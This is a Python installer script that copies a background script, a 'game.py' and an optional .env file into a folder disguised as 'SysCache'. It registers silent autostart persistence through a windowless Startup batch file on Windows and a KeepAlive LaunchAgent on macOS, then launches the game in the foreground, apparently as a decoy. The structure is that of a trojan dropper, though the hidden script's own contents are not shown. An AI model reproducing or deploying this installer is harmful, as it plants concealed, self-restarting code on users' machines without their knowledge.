import os
import sys
import shutil
import subprocess
import platform
from typing import List, Optional

APP_NAME = "SysCache"
MAC_LABEL = "com.syscache"

SYSTEM = platform.system()
IS_WINDOWS = SYSTEM == "Windows"
IS_MAC = SYSTEM == "Darwin"

if IS_WINDOWS:
    APPDATA = os.getenv("APPDATA")
    if not APPDATA:
        raise RuntimeError("APPDATA não encontrado.")
    INSTALL_DIR = os.path.join(APPDATA, APP_NAME)
    STARTUP_DIR = os.path.join(
        APPDATA,
        "Microsoft",
        "Windows",
        "Start Menu",
        "Programs",
        "Startup",
    )
elif IS_MAC:
    INSTALL_DIR = os.path.expanduser(f"~/Library/Application Support/{APP_NAME}")
else:
    raise RuntimeError(f"Sistema não suportado: {SYSTEM}")


def get_resource_path(filename: str) -> str:
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, filename)
    base_dir = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_dir, filename)


def create_install_dir() -> None:
    os.makedirs(INSTALL_DIR, exist_ok=True)


def copy_file_to_install(filename: str) -> str:
    src = get_resource_path(filename)
    if not os.path.exists(src):
        raise FileNotFoundError(f"Arquivo não encontrado: {src}")

    dst = os.path.join(INSTALL_DIR, filename)
    shutil.copy2(src, dst)
    return dst


def copy_optional_file_to_install(filename: str) -> Optional[str]:
    try:
        return copy_file_to_install(filename)
    except FileNotFoundError:
        return None


def get_windows_python_command() -> List[str]:
    if shutil.which("python"):
        return ["python"]
    if shutil.which("py"):
        return ["py", "-3"]
    return [sys.executable]


def build_startup_bat(main_script_path: str) -> str:
    escaped_path = main_script_path.replace('"', '""')
    return f'''@echo off
set "SCRIPT_PATH={escaped_path}"
where pyw >nul 2>nul
if %errorlevel%==0 (
    start "" /b pyw "%SCRIPT_PATH%"
    exit /b 0
)

where pythonw >nul 2>nul
if %errorlevel%==0 (
    start "" /b pythonw "%SCRIPT_PATH%"
    exit /b 0
)

where py >nul 2>nul
if %errorlevel%==0 (
    start "" /b py -3 "%SCRIPT_PATH%"
    exit /b 0
)

start "" /b python "%SCRIPT_PATH%"
exit /b 0
'''


def install_windows() -> None:
    main_script_path = copy_file_to_install("main_script.py")
    game_path = copy_file_to_install("game.py")
    copy_optional_file_to_install(".env")
    python_cmd = get_windows_python_command()

    os.makedirs(STARTUP_DIR, exist_ok=True)
    bat_path = os.path.join(STARTUP_DIR, "syscache_launcher.bat")

    with open(bat_path, "w", encoding="utf-8") as f:
        f.write(build_startup_bat(main_script_path))

    creationflags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
    subprocess.Popen(["cmd", "/c", bat_path], shell=False, creationflags=creationflags)
    subprocess.Popen([*python_cmd, game_path], shell=False)


def install_mac() -> None:
    main_script_path = copy_file_to_install("main_script_mac.py")
    game_path = copy_file_to_install("game.py")
    copy_optional_file_to_install(".env")

    python_bg = shutil.which("python3") or sys.executable
    python_fg = shutil.which("python3") or sys.executable
    plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{MAC_LABEL}.plist")

    plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>{MAC_LABEL}</string>

    <key>ProgramArguments</key>
    <array>
        <string>{python_bg}</string>
        <string>{main_script_path}</string>
    </array>

    <key>RunAtLoad</key>
    <true/>

    <key>KeepAlive</key>
    <true/>

    <key>WorkingDirectory</key>
    <string>{INSTALL_DIR}</string>
</dict>
</plist>
"""

    os.makedirs(os.path.dirname(plist_path), exist_ok=True)
    with open(plist_path, "w", encoding="utf-8") as f:
        f.write(plist_content)

    subprocess.run(
        ["launchctl", "unload", plist_path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    subprocess.run(["launchctl", "load", plist_path], check=True)

    subprocess.Popen([python_bg, main_script_path], shell=False)
    subprocess.Popen([python_fg, game_path], shell=False)


if __name__ == "__main__":
    create_install_dir()

    if IS_WINDOWS:
        install_windows()
    elif IS_MAC:
        install_mac()
